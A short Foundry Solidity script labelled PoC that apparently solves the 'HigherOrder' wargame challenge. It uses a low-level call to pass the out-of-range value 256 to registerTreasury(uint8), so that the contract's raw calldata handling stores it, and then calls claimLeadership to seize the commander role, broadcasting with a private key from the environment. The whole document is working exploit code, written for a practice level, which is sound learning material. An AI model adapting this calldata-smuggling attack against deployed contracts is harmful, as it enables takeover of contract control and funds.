// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";

interface IHigherOrder {
    function commander() external view returns (address);

    function treasury() external view returns (uint256);

    function registerTreasury(uint8) external;

    function claimLeadership() external;
}

contract PoC is Script {
    IHigherOrder private immutable higherOrder =
        IHigherOrder(0x2917260322a451BED3074D521B2069fA9f8175ef); // Replace with your HigherOrder instance

    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployer);

        address(higherOrder).call(
            abi.encodeWithSignature("registerTreasury(uint8)", 256)
        );
        require(higherOrder.treasury() == 256, "Treasury should be 256");
        console2.log("Treasury: ", higherOrder.treasury());

        higherOrder.claimLeadership();
        console2.log("Commander: ", higherOrder.commander());

        vm.stopBroadcast();
    }
}
